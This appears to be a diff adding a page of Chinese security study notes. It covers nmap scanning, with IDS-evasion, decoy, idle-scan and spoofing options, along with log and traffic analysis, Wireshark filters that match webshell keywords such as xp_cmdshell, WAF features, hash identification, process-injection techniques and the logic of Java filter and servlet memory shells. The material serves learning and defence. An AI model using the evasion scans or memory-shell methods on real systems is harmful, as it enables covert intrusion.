+<li><input disabled="" type="checkbox"> 4.备份恢复</li>
+<li><input disabled="" type="checkbox"> 5.重装系统</li>
+</ul>
+<h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><p>nmap 扫描基础命令</p>
+<p>-sT TCP (全)连接扫描，准确但留下大量日志记录</p>
+<p>-sS TCP SYN (半)扫描，速度较快，不会留下日志</p>
+<p>-sN null 扫描，标志位全为 0，不适用 Windows</p>
+<p>-sF FIN 扫描，标志位 FIN&#x3D;1，不适用 Windows</p>
+<p>-O 查看目标主机系统版本</p>
+<p>-sV 探测服务版本</p>
+<p>-A 全面扫描</p>
+<p>所有的扫描选项都是以-s<x>形式出现的</p>
+<p>ACK -sA | UDP -sU</p>
+<p>端口六个状态</p>
+<p>open(开放的)</p>
+<p>closed(关闭的) 关闭的关口是可访问的</p>
+<p>filtered(被过滤的) 建议再次扫描</p>
+<p>unfiltered(未被过滤的) 未被过滤状态意味着端口可访问，但Nmap不能确定它是开放还是关闭。</p>
+<p>open|filtered(开放或者被过滤的) 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃 了探测报文或者它引发的任何响应。因此Nmap无法确定该端口是开放的还是被过滤的。</p>
+<p>closed|filtered(关闭或者被过滤的) 该状态用于Nmap不能确定端口是关闭的还是被过滤的。 它只可能出现在IPID Idle扫描中。</p>
+<p>时序选项</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">\1. nmap -sT 192.168.96.4  //TCP连接扫描，不安全，慢</span><br><span class="line"></span><br><span class="line">\2. nmap -sS 192.168.96.4  //SYN扫描,使用最频繁，安全，快</span><br><span class="line"></span><br><span class="line">\3. nmap -Pn 192.168.96.4  //目标机禁用ping，绕过ping扫描</span><br><span class="line"></span><br><span class="line">\4. nmap -sU 192.168.96.4  //UDP扫描,慢,可得到有价值的服务器程序</span><br><span class="line"></span><br><span class="line">\5. nmap -sI 僵尸ip 目标ip  //使用僵尸机对目标机发送数据包</span><br><span class="line"></span><br><span class="line">\6. nmap -sA 192.168.96.4  //检测哪些端口被屏蔽</span><br><span class="line"></span><br><span class="line">\7. nmap 192.168.96.4 -p &lt;portnumber&gt;  //对指定端口扫描</span><br><span class="line"></span><br><span class="line">\8. nmap 192.168.96.1/24 //对整个网段的主机进行扫描</span><br><span class="line"></span><br><span class="line">\9. nmap 192.168.96.4 -oX myscan.xml //对扫描结果另存在myscan.xml</span><br><span class="line"></span><br><span class="line">\10. nmap -T1~6 192.168.96.4  //设置扫描速度，一般T4足够。</span><br><span class="line"></span><br><span class="line">\11. nmap -sV 192.168.96.4  //对端口上的服务程序版本进行扫描</span><br><span class="line"></span><br><span class="line">\12. nmap -O 192.168.96.4  //对目标主机的操作系统进行扫描</span><br><span class="line"></span><br><span class="line">\13. nmap -sC &lt;scirptfile&gt; 192.168.96.4  //使用脚本进行扫描，耗时长</span><br><span class="line"></span><br><span class="line">\14. nmap -A 192.168.96.4  //强力扫描，耗时长</span><br><span class="line"></span><br><span class="line">\15. nmap -6 ipv6地址  //对ipv6地址的主机进行扫描</span><br><span class="line"></span><br><span class="line">\16. nmap -f 192.168.96.4  //使用小数据包发送，避免被识别出</span><br><span class="line"></span><br><span class="line">\17. nmap –mtu &lt;size&gt; 192.168.96.4 //发送的包大小,最大传输单元必须是8的整数</span><br><span class="line"></span><br><span class="line">\18. nmap -D &lt;假ip&gt; 192.168.96.4 //发送参杂着假ip的数据包检测</span><br><span class="line"></span><br><span class="line">\19. nmap --source-port &lt;portnumber&gt; //针对防火墙只允许的源端口</span><br><span class="line"></span><br><span class="line">\20. nmap –data-length: &lt;length&gt; 192.168.96.4 //改变发生数据包的默认的长度，避免被识别出来是nmap发送的。</span><br><span class="line"></span><br><span class="line">\21. nmap -v 192.168.96.4  //显示冗余信息(扫描细节)</span><br><span class="line"></span><br><span class="line">\22. nmap -sn 192.168.96.4  //对目标进行ping检测，不进行端口扫描（会发送四种报文确定目标是否存活,）</span><br><span class="line"></span><br><span class="line">\23. nmap -sP 192.168.96.4  //仅仅对目标进行ping检测。</span><br><span class="line"></span><br><span class="line">\24. nmap -n/-p 192.168.96.4  //-n表示不进行dns解析，-p表示要</span><br><span class="line"></span><br><span class="line">\25. nmap --system-dns 192.168.96.4  //扫描指定系统的dns服务器</span><br><span class="line"></span><br><span class="line">\26. nmap –traceroute 192.168.96.4  //追踪每个路由节点。</span><br><span class="line"></span><br><span class="line">\27. nmap -PE/PP/PM: 使用ICMP <span class="built_in">echo</span>, timestamp, and netmask 请求包发现主机。</span><br><span class="line"></span><br><span class="line">\28. nmap -sP 192.168.96.4    //主机存活性扫描，arp直连方式。</span><br><span class="line"></span><br><span class="line">\29. nmap -iR [number]    //对随机生成number个地址进行扫描。在Nmap中使用-T (0-5)可以启用时序选项，对于时序选项这里有0~5不同的选项。</span><br></pre></td></tr></table></figure>
+
+<h3 id="IDS-入侵检测系统"><a href="#IDS-入侵检测系统" class="headerlink" title="IDS:入侵检测系统"></a>IDS:入侵检测系统</h3><p>-T0 (偏执的):非常慢的扫描，用于IDS逃避。</p>
+<p>-T1 (鬼祟的):缓慢的扫描，用于IDS逃避。</p>
+<p>-T2 (文雅的):降低速度以降低对带宽的消耗，此选项- -般不常用。</p>
+<p>-T3 (普通的):默认，根据目标的反应自动调整时间。</p>
+<p>-T4 (野蛮的):快速扫描，常用扫描方式，需要在很好的网络环境下进行扫描，请求可能会淹没目标。</p>
+<p>-T5 (疯狂的):极速扫描，这种扫描方式以牺牲准确度来提升扫描速度。</p>
+<p>(现在一般用-T4)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 192.168.21.1</span><br></pre></td></tr></table></figure>
+
+<p>常用扫描选项</p>
+<p>-p 指定扫描端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80,445 192.168.21.1</span><br><span class="line"></span><br><span class="line">nmap -p 1-1000 192.168.21.1</span><br></pre></td></tr></table></figure>
+
+<p>-F 快速扫描常用端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -F 192.168.21.1</span><br></pre></td></tr></table></figure>
+
+<p>-r 使用该选项不会对端口进行随机的顺序扫描</p>
+<p>–top-ports </p>
+<h3 id="扫描开发概率最高的1000个TCP端口"><a href="#扫描开发概率最高的1000个TCP端口" class="headerlink" title="扫描开发概率最高的1000个TCP端口"></a>扫描开发概率最高的1000个TCP端口</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap --top-ports 1000 192.168.21.1</span><br><span class="line"></span><br><span class="line">nmap --top-ports 100 192.168.21.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="TCP-SYN-扫描-sS"><a href="#TCP-SYN-扫描-sS" class="headerlink" title="TCP SYN 扫描 -sS"></a>TCP SYN 扫描 -sS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS 192.168.21.1</span><br></pre></td></tr></table></figure>
+
+<p>比较常用,扫描速度较快</p>
+<p>比较隐蔽,不会轻易被目标主机发现</p>
+<h3 id="TCP-连接扫描-sT"><a href="#TCP-连接扫描-sT" class="headerlink" title="TCP 连接扫描 -sT"></a>TCP 连接扫描 -sT</h3><p>用于SYN扫描不能用的时候</p>
+<p>基本不会对目标主机进行泛洪攻击或导致目标主机崩溃</p>
+<p>比较稳定,基础</p>
+<p>首先选用SYN扫描</p>
+<h3 id="UDP扫描-sU"><a href="#UDP扫描-sU" class="headerlink" title="UDP扫描-sU"></a>UDP扫描-sU</h3><p>使用-sU选项可以进行UDP扫描。UDP扫描是非常慢的，很多的安全审核人员忽略了这些端口，这显然是一个错误的做法。</p>
+<h3 id="隐藏扫描-sN-sF-sX"><a href="#隐藏扫描-sN-sF-sX" class="headerlink" title="隐藏扫描-sN -sF -sX"></a>隐藏扫描-sN -sF -sX</h3><p>-sF FIN扫描,使用TCP SYN被目标主机防火墙发现,会阻止SYN数据包.</p>
+<p>这时候可以用-sF 尝试穿透</p>
+<p>这些扫描方式可能会躲过一些无状态防火墙的过滤</p>
+<h3 id="空闲扫描-利用跳板-x2F-代理扫描"><a href="#空闲扫描-利用跳板-x2F-代理扫描" class="headerlink" title="空闲扫描,利用跳板&#x2F;代理扫描"></a>空闲扫描,利用跳板&#x2F;代理扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sI www.0day.co:80 192.168.21.1</span><br></pre></td></tr></table></figure>
+
+<p>这里是利用僵尸主机为www0day.co 的主机对192.168.126.131 进行空闲扫描，如果有IDS，IDS 则会把www0day.co当作扫描者。</p>
+<h3 id="全端口版本探测"><a href="#全端口版本探测" class="headerlink" title="全端口版本探测"></a>全端口版本探测</h3><p>nmap -sV –allports 192.168.21.1</p>
+<h3 id="设置扫描强度"><a href="#设置扫描强度" class="headerlink" title="设置扫描强度"></a>设置扫描强度</h3><p>–version-intensity 0~9</p>
+<p>数值越大,可能越准确,耗时也更长</p>
+<p>0最低 9最高</p>
+<p>默认是7</p>
+<p>获取详细的版本信息</p>
+<p>–version-trace</p>
+<h3 id="操作系统探测"><a href="#操作系统探测" class="headerlink" title="操作系统探测"></a>操作系统探测</h3><p>nmap -O 192.168.21.1</p>
+<h3 id="报文分段"><a href="#报文分段" class="headerlink" title="报文分段"></a>报文分段</h3><p>nmap -sV -F 192.168.1.100</p>
+<p>IP欺骗 -D</p>
+<p>RND 随机生成:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -D RND:11 192.168.21.1</span><br></pre></td></tr></table></figure>
+
+<p>指定IP:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -D 192.168.1.1,192.168.1.2,192.168.1.3 192.168.21.1</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是，诱饵主机必须处于工作状态，否则会导致目标主机的SYN洪水攻击。</p>
+<h3 id="源地址欺骗-sI"><a href="#源地址欺骗-sI" class="headerlink" title="源地址欺骗-sI"></a>源地址欺骗-sI</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sI www. 0day.co:80 192.168.126.131</span><br></pre></td></tr></table></figure>
+
+<h3 id="源端口欺骗"><a href="#源端口欺骗" class="headerlink" title="源端口欺骗"></a>源端口欺骗</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --source-port 53 182.168.21.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="MAC地址欺骗"><a href="#MAC地址欺骗" class="headerlink" title="MAC地址欺骗"></a>MAC地址欺骗</h3><p>–spoof-mac 0会随机生成一个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -PN --spoof-mac 0 192.168.126.131</span><br></pre></td></tr></table></figure>
+
+<h3 id="保存和输出"><a href="#保存和输出" class="headerlink" title="保存和输出"></a>保存和输出</h3><p>标准保存 -oN</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -F -oN test.txt 192.168.21.1</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="误报和攻击日志分析"><a href="#误报和攻击日志分析" class="headerlink" title="误报和攻击日志分析"></a>误报和攻击日志分析</h2><h3 id="恶意文件处理"><a href="#恶意文件处理" class="headerlink" title="恶意文件处理"></a>恶意文件处理</h3><p>首先看它的来源和去向，然后可以下载但不运行，放入微步沙箱中，看是否有后门，若有后门，就用 IDA 反汇编得到恶意攻击者的有用信息，再进一步描绘出攻击者画像进行溯源</p>
+<h3 id="防火墙报警如何确定是不是误判"><a href="#防火墙报警如何确定是不是误判" class="headerlink" title="防火墙报警如何确定是不是误判"></a>防火墙报警如何确定是不是误判</h3><p>一般情况下，真实攻击不可能只持续一次，它一定是长时间、周期性、多 IP 的进行攻击先去查看设备的完整流量日志等信息。在护网过程中如果确实存在异常流量应当及时进行上报，确认是误报后做好事件记录</p>
+<h3 id="怎么确定xss攻击是不是误报"><a href="#怎么确定xss攻击是不是误报" class="headerlink" title="怎么确定xss攻击是不是误报"></a>怎么确定xss攻击是不是误报</h3><p>xss攻击有相应的关键字和语句的，比如出现onerror，onload等关键字，然后出现了document. Cookie类似这些关键字，基本可以确定是xss注入，看下日志文件，如果一开始频繁的利用单双引号闭合，或者利用alert进行测试，基本也能确定，而合法的语句没有这些</p>
+<h3 id="比如数据包或者日志，你的分析思路是什么，以及你会用到哪些工具或者那些网站进行查询？"><a href="#比如数据包或者日志，你的分析思路是什么，以及你会用到哪些工具或者那些网站进行查询？" class="headerlink" title="比如数据包或者日志，你的分析思路是什么，以及你会用到哪些工具或者那些网站进行查询？"></a>比如数据包或者日志，你的分析思路是什么，以及你会用到哪些工具或者那些网站进行查询？</h3><p>用流量监测的安全设备，比如天眼，查看报文，分析报文里和 host 和网站目录路径，查看是否可疑，使用微步查询 host 是否为恶意，使用 wireshark 对数据包深度分析</p>
+<p>看一下请求的网站路径，源 IP 与目的 IP 地址，host 字段的值以及发包内容等</p>
+<p>工具有 wireshark，网站的话微步在线等威胁情报中心</p>
+<h3 id="文件上传和命令执行，有看过相关日志吗"><a href="#文件上传和命令执行，有看过相关日志吗" class="headerlink" title="文件上传和命令执行，有看过相关日志吗"></a>文件上传和命令执行，有看过相关日志吗</h3><p>文件：可能在系统有上传功能或者有文本编辑器，看一下是否有 base64 加密或者 url 加密，解码验证一下是否有恶意代码</p>
+<p>系统日志：有没有 web 容器做了一些危险行为，比如 bash 反弹 shell 等</p>
+<p>网络应用日志：有没有异常的网站文件，类似 webshell 等，就有可能是命令执行</p>
+<h3 id="windows日志分析工具"><a href="#windows日志分析工具" class="headerlink" title="windows日志分析工具"></a>windows日志分析工具</h3><p>Event Log Explorer</p>
+<h4 id="给你一个比较大的日志，应该如何分析"><a href="#给你一个比较大的日志，应该如何分析" class="headerlink" title="给你一个比较大的日志，应该如何分析"></a>给你一个比较大的日志，应该如何分析</h4><p>攻击规则匹配，通过正则匹配日志中的攻击请求</p>
+<p>统计方法，统计请求出现次数，次数少于同类请求平均次数则为异常请求</p>
+<p>白名单模式，为正常请求建立白名单，不在名单范围内则为异常请求</p>
+<p>HMM 模型，类似于白名单，不同点在于可对正常请求自动化建立模型，从而通过正常模型找出不匹配者则为异常请求</p>
+<p>借助日志分析工具，如 LogForensics 腾讯实验室 <a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/opensource/detail/15">https://security.tencent.com/index.php/opensource/detail/15</a></p>
+<h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><h3 id="有哪些防护方式？"><a href="#有哪些防护方式？" class="headerlink" title="有哪些防护方式？"></a>有哪些防护方式？</h3><p>Web基础防护</p>
+<p>可防范常规的 web 应用攻击，如 SQL 注入攻击、XSS 跨站攻击等，可检测 webshell，检查 HTTP 上传通道中的网页木马，打开开关即实时生效</p>
+<p>CC 攻击防护</p>
+<p>可根据 IP、Cookie 或者 Referer 字段名设置灵活的限速策略，有效缓解 CC 攻击</p>
+<p>精准访问防护</p>
+<p>对常见 HTTP 字段进行条件组合， 支持定制化防护策略如CSRF防护，通过自定义规则的配置，更精准的识别恶意伪造请求、保护网站敏感信息、提高防护精准性</p>
+<p>IP 黑白名单</p>
+<p>添加终拦截与始终放行的黑白名单 IP，增加防御准确性</p>
+<p>地理位置访问控制</p>
+<p>添加地理位置访问控制规则，针对来源 IP 进行自定义访问控制</p>
+<p>网页防篡改</p>
+<p>对网站的静态网页进行缓存配置，当用户访问时返回给用户缓存的正常页面，并随机检测网页是否被篡改</p>
+<p>网站反爬虫</p>
+<p>动态分析网站业务模型，结合人机识别技术和数据风控手段，精准识别爬虫行为</p>
+<p>误报屏蔽</p>
+<p>针对特定请求忽略某些攻击检测规则，用于处理误报事件</p>
+<p>隐私屏蔽</p>
+<p>隐私信息屏蔽，避免用户的密码等信息出现在事件日志中</p>
+<p>防敏感信息泄露</p>
+<p>防止在页面中泄露用户的敏感信息，例如：用户的身份证号码、手机号码、电子邮箱等</p>
+<h2 id="不具备的功能："><a href="#不具备的功能：" class="headerlink" title="不具备的功能："></a>不具备的功能：</h2><p> WAF不能过滤其他协议流量，如FTP、PoP3协议</p>
+<p> WAF不能实现传统防护墙功能，如地址映射</p>
+<p> WAF不能防止网络层的DDoS攻击</p>
+<p> WAF不能防病毒</p>
+<p>1.基础防火墙FW&#x2F;NGFW类</p>
+<p> 主要是可实现基本包过滤策略的防火墙，这类是有硬件处理、软件处理等，其主要功能实现是限制对IP:port的访问。基本上的实现都是默认情况下关闭所有的通过型访问，只开放允许访问的策略。FW可以拦截低层攻击行为，但对<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%BA%94%E7%94%A8%E5%B1%82&spm=1001.2101.3001.7020">应用层</a>的深层攻击行为无能为力</p>
+<p>2.IDS类</p>
+<p> 此类产品基本上以旁路为主，特点是不阻断任何网络访问，主要以提供报告和事后监督为主，少量的类似产品还提供TCP阻断等功能，但少有使用。</p>
+<p>3.IPS类</p>
+<p> 解决了IDS无法阻断的问题，基本上以在线模式为主，系统提供多个端口，以透明模式工作。在一些传统防火墙的新产品中也提供了类似功能，其特点是可以分析到数据包的内容，解决传统防火墙只能工作在4层以下的问题。和IDS一样，IPS也要像防病毒系统定义N种已知的攻击模式，并主要通过模式匹配去阻断非法访问,致命缺点在于不能主动的学习攻击方式，对于模式库中不能识别出来的攻击，默认策略是允许</p>
+<p>访问的！</p>
+<p> IPS类设备，常被串接在主干路上，对内外网异常流量进行监控处理</p>
+<p>4.UTM类安全设备</p>
+<p> 是以上三者的结合体，按照IDC提出“统一威胁管理”的概念来看，UTM是将防病毒、入侵检测和防火墙安全设备划归到一起“统一管理”的新类别。</p>
+<p> IDC将防病毒、防火墙和入侵检测等概念融合到被称为统一威胁管理的新类别中，该概念引起了业界的广泛重视，并推动了以整合式安全设备为代表的市场细分的诞生。由IDC提出的UTM是指由硬件、软件和网络技术组成的具有专门用途的设备，它主要提供一项或多项安全功能，将多种安全特性集成于一个硬设备里，构成一个标准的统一管理平台。</p>
+<p> 由于性能要求出众，导致造价一般比较高，目前一般只有大型企业会有使用。</p>
+<p> UTM的优点主要有以下几条</p>
+<p> 1.整合所带来的成本降低（一身兼多职嘛！） </p>
+<p> 2.降低信息安全工作强度 （减轻管理员负担）</p>
+<p> 3.降低技术复杂度</p>
+<p> UTM也不能一劳永逸的解决所有安全问题，总结下来，有如下缺点</p>
+<p> 1.网关防御的弊端 </p>
+<p> 网关防御在防范外部威胁的时候非常有效，但是在面对内部威胁的时候就无法发挥作用了。有很多资料表明造成组织信息资产损失的威胁大部分来自于组织内部，所以以网关型防御为主的UTM设备目前尚不是解决安全问题的万灵药。 </p>
+<p> 2.过度集成带来的风险</p>
+<p> 3.性能和稳定性</p>
+<p>5.主动安全类</p>
+<h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><h2 id="如何通过流量来分析安全事件？"><a href="#如何通过流量来分析安全事件？" class="headerlink" title="如何通过流量来分析安全事件？"></a>如何通过流量来分析安全事件？</h2><p>答：</p>
+<p>结合态势感知设备的告警信息来仔细审查请求数据包和返回数据包，比如SQL注入攻击，请求数据包里面是否有单引号或者select等一些敏感字符，返回包里面是否存在SQL语法报错信息，如果有的话就说明存在SQL注入攻击的行为，接下来就找到具体告警的位置进行人工分析，确认漏洞是否存在</p>
+<p>假设发现web应用服务器发现文件异常增多，初步怀疑被上传webshell，描述流量分析溯源的思路</p>
+<h3 id="可利用流量工具进行溯源："><a href="#可利用流量工具进行溯源：" class="headerlink" title="可利用流量工具进行溯源："></a>可利用流量工具进行溯源：</h3><p>1）查看eval、z0、shell、whoami等关键字，查看出现次数过多的时候，可能</p>
+<p>需要查看是哪个页面发起的请求，有可能是webshell</p>
+<p>2）通过 WireShark 工具快速搜索关键字，定位到异常流量包</p>
+<p>3）找出异常IP和所上传的内容，查看是否为webshell</p>
+<h3 id="如何定位到攻击IP："><a href="#如何定位到攻击IP：" class="headerlink" title="如何定位到攻击IP："></a>如何定位到攻击IP：</h3><p>1)首先通过选择-统计-对话查看流量的走向情况，定位可疑的IP地址</p>
+<p>2)根据定位到的IP地址，尝试对上传的webshell进行定位ip.addr &#x3D;&#x3D;ip &amp;&amp;http matches “uploadleval|select|xp_cmdshell”&amp;&amp; http.request.method &#x3D;&#x3D; “POST”</p>
+<p>3)查找到 Webshell后尝试溯源漏洞位置，http.request.uri contains“webshell.php”，定位到最开始webshell执行或上传的时候</p>
+<p>4)根据最开始的HTTP上传包或者其他漏洞特产定位漏洞类型</p>
+<h3 id="wireshark简单的过滤规则"><a href="#wireshark简单的过滤规则" class="headerlink" title="wireshark简单的过滤规则"></a>wireshark简单的过滤规则</h3><p>【过滤ip】：过滤源ip地址:ip.src1.1.1.1;目的ip地址：ip.dst1.1.1.1;</p>
+<p>【过滤端口】：过滤80端口：tcp.port80，源端口：tcp.srcport80，目的端口：tcp.dstport&#x3D;&#x3D;80</p>
+<p>【协议过滤】：直接输入协议名即可，如http协议http</p>
+<p>【http模式过滤】：过滤get&#x2F;post包http.request.mothod&#x3D;&#x3D;”GET&#x2F;POST”</p>
+<h2 id="加密方式辨别"><a href="#加密方式辨别" class="headerlink" title="加密方式辨别"></a>加密方式辨别</h2><p>编码系列</p>
+<h4 id="Base-系列编码"><a href="#Base-系列编码" class="headerlink" title="Base 系列编码"></a>Base 系列编码</h4><p>Base64：一般情况下结尾都会有 1 个或者 2 个等号，明文很少的时候可能没有；</p>
+<h4 id="Unicode-编码"><a href="#Unicode-编码" class="headerlink" title="Unicode 编码"></a>Unicode 编码</h4><p>以 \u、&amp;# 或 &amp;#x 开头，后面是数字加字母组合</p>
+<h4 id="Escape-编码"><a href="#Escape-编码" class="headerlink" title="Escape 编码"></a>Escape 编码</h4><p>以 %u 开头，后面是数字加字母组合</p>
+<h4 id="URL-x2F-Hex-编码"><a href="#URL-x2F-Hex-编码" class="headerlink" title="URL &#x2F; Hex 编码"></a>URL &#x2F; Hex 编码</h4><p>URL 和 Hex 编码的结果是一样的，不同的是当你用 URL 编码网址时是不会把 http、https 关键字和 &#x2F;、?、&amp;、&#x3D; 等连接符进行编码的，而 Hex 编码则全部转化了，其主要特征如下：</p>
+<p>以 % 开头，后面是数字加字母组合</p>
+<p>加密算法</p>
+<h4 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h4><p>密文一般为 16 位或者 32 位，其中 16 位是取的 32 位第 9~25 位的值；</p>
+<p>组成方式为字母（a-f）和数字（0-9）混合，字母可以全部是大写或者小写。</p>
+<h4 id="SHA-系列"><a href="#SHA-系列" class="headerlink" title="SHA 系列"></a>SHA 系列</h4><p>SHA-1：字母（a-f）和数字（0-9）混合，固定位数 40 位；</p>
+<p>SHA-224&#x2F;SHA3-224：字母（a-f）和数字（0-9）混合，固定位数 56 位；</p>
+<p>SHA-256&#x2F;SHA3-256：字母（a-f）和数字（0-9）混合，固定位数 64 位；</p>
+<p>SHA-384&#x2F;SHA3-384：字母（a-f）和数字（0-9）混合，固定位数 96 位；</p>
+<p>SHA-512&#x2F;SHA3-512：字母（a-f）和数字（0-9）混合，固定位数 128 位。</p>
+<h4 id="HMAC-系列"><a href="#HMAC-系列" class="headerlink" title="HMAC 系列"></a>HMAC 系列</h4><p>HMAC 这种算法就是在 MD5、SHA 两种加密的基础上引入了秘钥，其密文也和 MD5、SHA 类似，密文的长度和使用的 MD5、SHA 算法对应密文的长度是一样的。特征如下： </p>
+<p>HMAC-MD5：字母（a-f）和数字（0-9）混合，位数一般为 32 位；</p>
+<p>HMAC-SHA-1：字母（a-f）和数字（0-9）混合，固定位数 40 位；</p>
+<p>HMAC-SHA-224 &#x2F; HMAC-SHA3-224：字母（a-f）和数字（0-9）混合，固定位数 56 位；</p>
+<p>HMAC-SHA-256 &#x2F; HMAC-SHA3-256：字母（a-f）和数字（0-9）混合，固定位数 64 位；</p>
+<p>HMAC-SHA-384 &#x2F; HMAC-SHA3-384：字母（a-f）和数字（0-9）混合，固定位数 96 位；</p>
+<p>HMAC-SHA-512 &#x2F; HMAC-SHA3-512：字母（a-f）和数字（0-9）混合，固定位数 128 位。</p>
+<h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>RSA 加密算法是一种非对称加密算法，通过公钥加密结果，必须私钥解密。同样私钥加密结果，公钥可以解密，应用非常广泛，在网站中通常使用 JSEncrypt 库来实现，其最大的特征就是有一个设置公钥的过程，我们可以通过以下方法来快速初步判断是否为 RSA 算法：</p>
+<p>搜索关键词 new JSEncrypt()，JSEncrypt 等，一般会使用 JSEncrypt 库，会有 new 一个实例对象的操作；</p>
+<p>搜索关键词 setPublicKey、setKey、setPrivateKey、getPublicKey 等，一般实现的代码里都含有设置密钥的过程。</p>
+<h2 id="Java内存马"><a href="#Java内存马" class="headerlink" title="Java内存马"></a>Java内存马</h2><h3 id="进程注入原理，调用了什么api"><a href="#进程注入原理，调用了什么api" class="headerlink" title="进程注入原理，调用了什么api?"></a>进程注入原理，调用了什么api?</h3><p>dll  pe 线程劫持 注册表</p>
+<p>PROCESS HOLLOWING 调用SetWindowsHookEx进行注入</p>
+<p>APC注入和AtomBombing内存注入</p>
+<p>通过SETWINDOWLONG提供EXTRA WINDOW MEMORY INJECTION</p>
+<p>使用SHIMS进行注入</p>
+<p>Hook导入表（IAT hooking）或 INLINE HOOKING</p>
+<p>首先我们得知道，java网站都一定会有一个web容器。listener、filter、servlet都是在web.xml中配置的</p>
+<p>tomcat本质是web服务器和servlet容器的集合体</p>
+<p>tomcat容器要完成的任务很简单，就是要能够提供一个接口让其它程序能够访问到 Service 集合，同时要维护所包含的所有 Service 的生命周期，包括如何初始化、如何结束服务、如何找到别人要访问它的 Service。还有一些次要的任务，如记录Service运行日志，维护Session等等。</p>
+<h3 id="filter型"><a href="#filter型" class="headerlink" title="filter型"></a>filter型</h3><p>将恶意数据例如filterdef、filtermap等添加到standardcontext中,然后生成一个filterconfig，并添加到filterconfigs中,恶意filter就会被自动加载到filterchain中并与我们指定的url绑定，形成filter形内存马，此时我们访问那个url就会触发内存马。恶意代码在我们写的filter中的dofilter函数中.</p>
+<p>逻辑：</p>
+<p>1创建恶意的filter。</p>
+<p>2创建FilterDef，里面存着filter的基本信息，例如类名。</p>
+<p>3创建FilterMap，里面是filter与url的绑定信息，换句话说就是访问哪个url时触发这个filter。可以理解成这一步是在更改web.xml文件。</p>
+<p>4通过StandardContext与FilterDef创建新的FilterConfig并添加到filterConfigs中并与之前声明的filter进行配对。</p>
+<p>5访问刚刚绑定的url即可添加filter内存马。</p>
+<p>一句话总结就是想办法在内存中写入一个恶意filter并与某个url绑定。</p>
+<h3 id="servlet型"><a href="#servlet型" class="headerlink" title="servlet型"></a>servlet型</h3><p>sevlet内存马就是通过反射机制调用调用StandardContext类的方法动态加载一个恶意类到内存中并调用其addServletMapping()函数将恶意servlet与我们指定的url绑定。此时我们访问那个恶意url即可完成攻击.</p>
+<p>逻辑：</p>
+<p>1、使用request.getServletContext()函数会得ServletContext，它本质是ApplicationContextFacade类的实例，任何用户都可以使用request.getServletContext()函数获取到ServletContext。</p>
+<p>2、ApplicationContextFacade类中封装有ApplicationContext类的私有对象，这个私有对象名为context。</p>
+<p>3、ApplicationContext中有StandardContext类的私有对象，名为context。</p>
+<p>4、StandardContext类的对象可以动态创建servlet和servlet的映射。</p>
+<p>综上，任意用户都可以通过反射机制调用StandardContext类的对象来动态创建servlet和servlet的映射。</p>
